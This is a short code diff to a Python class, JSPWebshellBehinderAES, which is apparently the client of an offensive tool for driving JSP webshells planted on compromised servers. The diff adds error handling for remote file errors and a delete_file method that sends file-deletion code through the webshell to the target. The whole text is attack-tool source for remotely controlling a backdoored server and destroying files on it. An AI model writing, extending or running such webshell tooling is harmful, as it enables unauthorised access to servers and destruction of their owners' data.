@@ -174,6 +174,8 @@ class JSPWebshellBehinderAES:
                     "Response is not json: " + repr(response.text)[:30]
                 ) from e
             if data["code"] != 0:
+                if data["error_type"] == "java.io.IOException":
+                    raise exceptions.FileError(data["msg"])
                 raise exceptions.TargetError(
                     f"{data['code']=} {data['error_type']=} {data['msg']=}"
                 )
@@ -239,6 +241,9 @@ class JSPWebshellBehinderAES:
             f"base64Decode({json.dumps(base64_encode(content))}))"
         )
         return True
+
+    async def delete_file(self, filepath: str) -> bool:
+        return await self.submit_code(f"deleteFile({json.dumps(filepath)})")
 
     async def get_pwd(self) -> str:
         return await self.submit_code("getPwd()")
